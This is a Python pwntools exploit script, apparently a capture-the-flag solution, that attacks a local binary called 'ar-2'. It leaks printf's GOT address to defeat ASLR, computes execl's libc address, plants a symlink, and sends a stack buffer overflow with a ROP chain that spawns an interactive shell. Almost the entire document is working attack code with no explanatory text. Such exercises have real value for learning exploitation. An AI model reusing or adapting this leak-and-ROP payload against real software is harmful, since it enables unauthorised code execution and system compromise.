#!/usr/bin/env python
from pwn import *
import os

p = process('./ar-2')

# open libc to get offsets of functions
e = ELF('/lib/x86_64-linux-gnu/libc.so.6')

addr_printf = e.symbols['printf']
print("Libc of printf %s" % hex(addr_printf))

addr_system = e.symbols['execl']
print("Libc of system %s" % hex(addr_system))

offset = addr_system - addr_printf
print(offset)

p.sendline('8')

got_of_printf = p.elf.got['printf']
print("Got of printf %s" % hex(got_of_printf))
p.sendline(hex(got_of_printf))

print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()
printf_got = p.recv('8')
print(printf_got)

libc_printf = u64(printf_got)
print(hex(libc_printf))

# calculate the address of system
real_system = libc_printf + offset
print(hex(real_system))

'''
0x0000000000400a33 : pop rdi ; ret
0x0000000000400a31 : pop rsi ; pop r15 ; ret
'''

pop_rdi_ret = 0x400a33
pop_rsi_r15_ret = 0x400a31
string =0x400982

if os.path.exists("\270"):
    os.unlink("\270")
os.symlink("H","\270")

payload = "A"*0x80 + "BBBBBBBB"
payload += p64(pop_rdi_ret)+p64(string)+p64(pop_rsi_r15_ret)+p64(0)+p64(0)+p64(real_system)

p.sendline(payload)
p.interactive()
